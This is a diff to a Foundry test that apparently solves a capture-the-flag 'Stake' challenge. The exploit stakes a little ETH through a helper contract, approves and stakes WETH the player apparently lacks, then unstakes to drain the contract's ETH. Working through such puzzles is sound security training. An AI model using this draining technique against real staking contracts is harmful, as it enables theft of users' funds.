@@ -16,7 +16,14 @@ contract StakeAttack is Test {
         vm.startPrank(playerAddress);
         Stake stake = Stake(0x42d0a8D6D32E8962B2b1EA5A1baD458201616aA1);
         Helper helper = new Helper();
-        helper.attack{value: 0.002 ether}(stake);
+        console.log(playerAddress.balance);
+        helper.stake{value: 0.002 ether}(stake);
+        console.log(playerAddress.balance);
+        IERC20 weth = IERC20(stake.WETH());
+        weth.approve(address(stake), 10 ether);
+        stake.StakeWETH(10 ether);
+        stake.Unstake(0.001 ether);
+        stake.Unstake(9.999 ether);
         vm.stopPrank();
 
         assertTrue(
@@ -29,12 +36,7 @@ contract StakeAttack is Test {
 }
 
 contract Helper {
-    function attack(Stake stake) external payable {
-        stake.StakeETH{value: 0.002 ether}();
-        IERC20 weth = IERC20(stake.WETH());
-        weth.approve(address(stake), 0.002 ether);
-        stake.StakeWETH(0.002 ether);
-        stake.Unstake(0.001 ether);
-        stake.Unstake(0.003 ether);
+    function stake(Stake _stake) external payable {
+        _stake.StakeETH{value: 0.002 ether}();
     }
 }
